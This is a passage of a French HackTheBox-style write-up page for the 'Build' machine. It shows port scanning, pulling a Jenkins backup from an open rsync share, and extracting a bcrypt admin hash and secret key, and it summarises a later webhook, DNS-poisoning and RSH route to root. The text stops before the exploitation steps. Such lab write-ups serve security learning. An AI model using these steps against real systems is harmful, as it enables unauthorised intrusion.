@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Build - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/build/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Build">
+  <meta property="og:description" content="Build est une machine Linux classée comme facile. Elle implique la lecture de fichiers sensibles depuis des partages rsync non authentifiés, ce qui mène à l’exposition d’un mot de passe Jenkins chiffré. Je parvient à déchiffrer ce mot de passe, ce qui me permet d’accéder à Gitea. Le dépôt appartenant à l’administrateur sur Gitea dispose d’un webhook configuré, permettant d’obtenir une exécution de code arbitraire et un shell dans le conteneur Docker. Ce conteneur Docker a accès à MySQL et PowerDNS, qui s’exécutent tous deux dans un autre conteneur sur le même réseau Docker. Le conteneur a également un fichier monté nommé .rhosts, qui est aussi monté dans le répertoire racine de la machine hôte. MySQL est mal configuré et n’a pas de mot de passe pour le compte root, ce qui permet à un attaquant de prendre le contrôle total de la base de données. Une fois le hash de l’administrateur craqué et connecter à PowerDNS, je modifie l’enregistrement DNS intern/admin pour le rediriger vers ma propre machine. En supposant que le même fichier .rhosts est également monté sur la machine hôte, cela me permet d’obtenir une session root via le protocole Remote Shell Protocol (RSH).">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="PowerDNS">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Build">
+  <meta name="twitter:description" content="Build est une machine Linux classée comme facile. Elle implique la lecture de fichiers sensibles depuis des partages rsync non authentifiés, ce qui mène à l’exposition d’un mot de passe Jenkins chiffré. Je parvient à déchiffrer ce mot de passe, ce qui me permet d’accéder à Gitea. Le dépôt appartenant à l’administrateur sur Gitea dispose d’un webhook configuré, permettant d’obtenir une exécution de code arbitraire et un shell dans le conteneur Docker. Ce conteneur Docker a accès à MySQL et PowerDNS, qui s’exécutent tous deux dans un autre conteneur sur le même réseau Docker. Le conteneur a également un fichier monté nommé .rhosts, qui est aussi monté dans le répertoire racine de la machine hôte. MySQL est mal configuré et n’a pas de mot de passe pour le compte root, ce qui permet à un attaquant de prendre le contrôle total de la base de données. Une fois le hash de l’administrateur craqué et connecter à PowerDNS, je modifie l’enregistrement DNS intern/admin pour le rediriger vers ma propre machine. En supposant que le même fichier .rhosts est également monté sur la machine hôte, cela me permet d’obtenir une session root via le protocole Remote Shell Protocol (RSH).">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/build/" /><link rel="prev" href="http://localhost:1313/certificate/" /><link rel="next" href="http://localhost:1313/baby/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Build",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/build\/"
+        },"genre": "posts","keywords": "Linux, Medium, PowerDNS","wordcount":  2244 ,
+        "url": "http:\/\/localhost:1313\/build\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Build</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;2244 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;11 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#énumération">Énumération</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#dns---tcp-53">DNS - TCP 53</a></li>
+        <li><a href="#http---tcp-3000">HTTP - TCP 3000</a></li>
+        <li><a href="#rsync---tcp-874">RSync - TCP 874</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-en-tant-que-root-sur-docker">Shell en tant que root sur docker</a>
+      <ul>
+        <li><a href="#énumérer-le-backup">Énumérer le backup</a></li>
+        <li><a href="#connexion-à-gitea">Connexion à Gitea</a></li>
+        <li><a href="#reverse-shell">Reverse shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-en-tant-que-root">Shell en tant que root</a>
+      <ul>
+        <li><a href="#énumération-1">Énumération</a></li>
+        <li><a href="#connexion-mysql">Connexion MySQL</a></li>
+        <li><a href="#connexion-à-powerdns-admin">Connexion à PowerDNS-Admin</a></li>
+        <li><a href="#empoisonnement-dns">Empoisonnement DNS</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/build.png"
+        data-srcset="/images/Build/build.png, /images/Build/build.png 1.5x, /images/Build/build.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/build.png"
+        title="build" width="603" height="322" /></p>
+<p><strong>Build</strong> est une machine Linux classée comme facile. Elle implique la lecture de fichiers sensibles depuis des partages <strong>rsync</strong> non authentifiés, ce qui mène à l&rsquo;exposition d&rsquo;un mot de passe Jenkins chiffré. Je parvient à déchiffrer ce mot de passe, ce qui me permet d&rsquo;accéder à <strong>Gitea</strong>. Le dépôt appartenant à l&rsquo;administrateur sur <strong>Gitea</strong> dispose d&rsquo;un <code>webhook</code> configuré, permettant d&rsquo;obtenir une exécution de code arbitraire et un shell dans le conteneur Docker. Ce conteneur Docker a accès à <strong>MySQL</strong> et <code>PowerDNS</code>, qui s&rsquo;exécutent tous deux dans un autre conteneur sur le même réseau Docker. Le conteneur a également un fichier monté nommé <strong>.rhosts</strong>, qui est aussi monté dans le répertoire racine de la machine hôte. <strong>MySQL</strong> est mal configuré et n&rsquo;a pas de mot de passe pour le compte root, ce qui permet à un attaquant de prendre le contrôle total de la base de données. Une fois le hash de l&rsquo;administrateur craqué et connecter à <code>PowerDNS</code>, je modifie l&rsquo;enregistrement DNS <strong>intern/admin</strong> pour le rediriger vers ma propre machine. En supposant que le même fichier <strong>.rhosts</strong> est également monté sur la machine hôte, cela me permet d&rsquo;obtenir une session root via le protocole <strong>Remote Shell Protocol (RSH)</strong>.</p>
+<h1 id="énumération">Énumération</h1>
+<h2 id="nmap">Nmap</h2>
+<p>Je lance un scan tcp complet avec <code>rustscan</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rustscan -a 10.129.234.169 -u <span class="m">5000</span> -- -sV -sC -oN fulltcpscan.txt</span></span></code></pre></div></div>
+<p>Il y a 7 ports ouverts : SSH (22), DNS  (53), R-SERVICES (512,513,514), RSync (874) et HTTP (3000).</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PORT     STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 472173e26b96cdf91311af40c84dd67f <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwDujdYYBlK34trPdE896KV0Q89NkU0P+PNYKboWAXcOIzRxia7eKQnOZMDcbpjdpUgTlee4VpIiQwwKLfGLqg<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 2b5ebaf372d3b309df25412909f47bf5 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAhXu4iRkeWtuE4+/w9QwJeecIUqhFrfTiQsmNatD9LG
+</span></span><span class="line"><span class="cl">53/tcp   open  domain  syn-ack ttl <span class="m">62</span> PowerDNS
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NSID: pdns <span class="o">(</span>70646e73<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  id.server: pdns
+</span></span><span class="line"><span class="cl">512/tcp  open  <span class="nb">exec</span>    syn-ack ttl <span class="m">63</span> netkit-rsh rexecd
+</span></span><span class="line"><span class="cl">513/tcp  open  login?  syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">514/tcp  open  shell   syn-ack ttl <span class="m">63</span> Netkit rshd
+</span></span><span class="line"><span class="cl">873/tcp  open  rsync   syn-ack ttl <span class="m">63</span> <span class="o">(</span>protocol version 31<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3000/tcp open  ppp?    syn-ack ttl <span class="m">62</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines, Help, RTSPRequest:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Request</span></span></code></pre></div></div>
+<h2 id="dns---tcp-53">DNS - TCP 53</h2>
+<p>Je ne trouve aucun nom de domaine ni avec <code>nslookup</code> ni avec <code>dnsenum</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build
+</span></span><span class="line"><span class="cl">❯ nslookup 10.129.234.169
+</span></span><span class="line"><span class="cl">** server can<span class="s1">&#39;t find 169.234.129.10.in-addr.arpa: NXDOMAIN
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">/workspace/Build
+</span></span></span><span class="line"><span class="cl"><span class="s1">❯ dnsenum 10.129.234.169
+</span></span></span><span class="line"><span class="cl"><span class="s1">dnsenum VERSION:1.2.6
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">-----   10.129.234.169   -----
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Host&#39;</span>s addresses:
+</span></span><span class="line"><span class="cl">__________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Name Servers:
+</span></span><span class="line"><span class="cl">______________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 10.129.234.169 NS record query failed: NXDOMAIN</span></span></code></pre></div></div>
+<h2 id="http---tcp-3000">HTTP - TCP 3000</h2>
+<p>Le site semble être du Gitea.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/imagesBuild/Build-1.png"
+        data-srcset="/imagesBuild/Build-1.png, /imagesBuild/Build-1.png 1.5x, /imagesBuild/Build-1.png 2x"
+        data-sizes="auto"
+        alt="/imagesBuild/Build-1.png"
+        title="/imagesBuild/Build-1.png" /></p>
+<p>Il existe un repo <code>dev</code> de l&rsquo;utilisateur <code>buildadm</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/Build-2.png"
+        data-srcset="/images/Build/Build-2.png, /images/Build/Build-2.png 1.5x, /images/Build/Build-2.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/Build-2.png"
+        title="/images/Build/Build-2.png" width="1190" height="296" /></p>
+<p>Ce repo contient un fichier Jenkins.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/Build-3.png"
+        data-srcset="/images/Build/Build-3.png, /images/Build/Build-3.png 1.5x, /images/Build/Build-3.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/Build-3.png"
+        title="/images/Build/Build-3.png" width="664" height="318" /></p>
+<p>C&rsquo;est un fichier qui n&rsquo;exécute qu&rsquo;une commande système <code>/bin/true</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pipeline {
+</span></span><span class="line"><span class="cl">    agent any
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    stages {
+</span></span><span class="line"><span class="cl">        stage(&#39;Do nothing&#39;) {
+</span></span><span class="line"><span class="cl">            steps {
+</span></span><span class="line"><span class="cl">                sh &#39;/bin/true&#39;
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div></div>
+<p>La version de Gitea ne nous permettra pas de trouver de vulnérabilité exploitable ici.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/Build-4.png"
+        data-srcset="/images/Build/Build-4.png, /images/Build/Build-4.png 1.5x, /images/Build/Build-4.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/Build-4.png"
+        title="/images/Build/Build-4.png" width="490" height="80" /></p>
+<h2 id="rsync---tcp-874">RSync - TCP 874</h2>
+<p>Il existe un partage <code>backups</code>  sur le port RSync.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build
+</span></span><span class="line"><span class="cl">❯ rsync 10.129.234.169::
+</span></span><span class="line"><span class="cl">backups         backups</span></span></code></pre></div></div>
+<p>Je télécharge le contenu de ce partage. Il n&rsquo;y a qu&rsquo;une archive <code>Jenkins.tar.gz</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build   100s
+</span></span><span class="line"><span class="cl">❯ rsync -av rsync://10.129.234.169/backups/ ./backups/rsync: <span class="o">[</span>receiver<span class="o">]</span> write error: Broken pipe <span class="o">(</span>32<span class="o">)</span>
+</span></span><span class="line"><span class="cl">rsync error: received SIGINT, SIGTERM, or SIGHUP <span class="o">(</span>code 20<span class="o">)</span> at io.c<span class="o">(</span>1701<span class="o">)</span> <span class="o">[</span><span class="nv">sender</span><span class="o">=</span>3.2.7<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">receiving incremental file list
+</span></span><span class="line"><span class="cl">created directory ./backups
+</span></span><span class="line"><span class="cl">./
+</span></span><span class="line"><span class="cl">jenkins.tar.gz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sent <span class="m">50</span> bytes  received 376,381,276 bytes  3,567,595.51 bytes/sec
+</span></span><span class="line"><span class="cl">total size is 376,289,280  speedup is 1.00</span></span></code></pre></div></div>
+<h1 id="shell-en-tant-que-root-sur-docker">Shell en tant que root sur docker</h1>
+<h2 id="énumérer-le-backup">Énumérer le backup</h2>
+<p>J&rsquo;extrais le contenu de l&rsquo;archive.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">tar xvf jenkins.tar.gz</span></span></code></pre></div></div>
+<p>Je trouve un mot de passe hashé dans le fichier <code>jenkins_configuration/users/admin_8569439066427679502/config.xml</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build/backups   100s
+</span></span><span class="line"><span class="cl">❯ grep -iR <span class="s2">&#34;password&#34;</span>
+</span></span><span class="line"><span class="cl">--<span class="o">[</span>snip<span class="o">]</span>--
+</span></span><span class="line"><span class="cl">jenkins_configuration/users/admin_8569439066427679502/config.xml:      &lt;passwordHash&gt;#jbcrypt:<span class="nv">$2</span>a<span class="nv">$10$PaXdGyit8MLC9CEPjgw15</span>.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG&lt;/passwordHash&gt;</span></span></code></pre></div></div>
+<p>Je vois la configuration des différentes applications énumérées.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build/backups
+</span></span><span class="line"><span class="cl">❯ grep -iR <span class="s1">&#39;build.vl&#39;</span>
+</span></span><span class="line"><span class="cl">grep: jenkins.tar.gz: binary file matches
+</span></span><span class="line"><span class="cl">jenkins_configuration/jobs/build/state.xml:          &lt;avatar&gt;http://build.vl:3000/avatar/204239236134d8e6eb156992dd11c53e&lt;/avatar&gt;
+</span></span><span class="line"><span class="cl">jenkins_configuration/org.jenkinsci.plugin.gitea.servers.GiteaServers.xml:      &lt;displayName&gt;gitea.build.vl&lt;/displayName&gt;
+</span></span><span class="line"><span class="cl">jenkins_configuration/jenkins.model.JenkinsLocationConfiguration.xml:  &lt;jenkinsUrl&gt;http://build.vl:5000/&lt;/jenkinsUrl&gt;
+</span></span><span class="line"><span class="cl">jenkins_configuration/users/admin_8569439066427679502/config.xml:      &lt;emailAddress&gt;admin@build.vl&lt;/emailAddress&gt;</span></span></code></pre></div></div>
+<p>J&rsquo;ajoute le nom de domaine ainsi que le sous domaine dans le fichier <code>/etc/hosts</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.234.169 build.vl gitea.build.vl&#34;</span> <span class="p">|</span> tee -a /etc/hosts</span></span></code></pre></div></div>
+<p>Les fichiers <code>jenkins_configuration/secret.key</code> et <code>jenkins_configuration/config.xml</code> contiennent des informations qui ne nous serons pas très utiles pour la suite.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build/backups
+</span></span><span class="line"><span class="cl">❯ cat jenkins_configuration/secret.key
+</span></span><span class="line"><span class="cl">7ab384851b99c61462f5fb02dda5bc13a6ff84bba5e89fafa45f914c7b62f581#                                                                                           
+</span></span><span class="line"><span class="cl">/workspace/Build/backups
+</span></span><span class="line"><span class="cl">❯ cat jenkins_configuration/config.xml
+</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s1">&#39;1.1&#39;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span>?&gt;
+</span></span><span class="line"><span class="cl">&lt;hudson&gt;
+</span></span><span class="line"><span class="cl">  &lt;disabledAdministrativeMonitors&gt;
+</span></span><span class="line"><span class="cl">    &lt;string&gt;jenkins.diagnostics.SecurityIsOffMonitor&lt;/string&gt;
+</span></span><span class="line"><span class="cl">    &lt;string&gt;jenkins.diagnostics.ControllerExecutorsNoAgents&lt;/string&gt;
+</span></span><span class="line"><span class="cl">    &lt;string&gt;hudson.util.DoubleLaunchChecker&lt;/string&gt;
+</span></span><span class="line"><span class="cl">  &lt;/disabledAdministrativeMonitors&gt;
+</span></span><span class="line"><span class="cl">  &lt;version&gt;2.441&lt;/version&gt;
+</span></span><span class="line"><span class="cl">  &lt;numExecutors&gt;2&lt;/numExecutors&gt;
+</span></span><span class="line"><span class="cl">  &lt;mode&gt;NORMAL&lt;/mode&gt;
+</span></span><span class="line"><span class="cl">  &lt;useSecurity&gt;true&lt;/useSecurity&gt;
+</span></span><span class="line"><span class="cl">  &lt;authorizationStrategy <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;hudson.security.AuthorizationStrategy</span><span class="nv">$Unsecured</span><span class="s2">&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl">  &lt;securityRealm <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;hudson.security.SecurityRealm</span><span class="nv">$None</span><span class="s2">&#34;</span>/&gt;
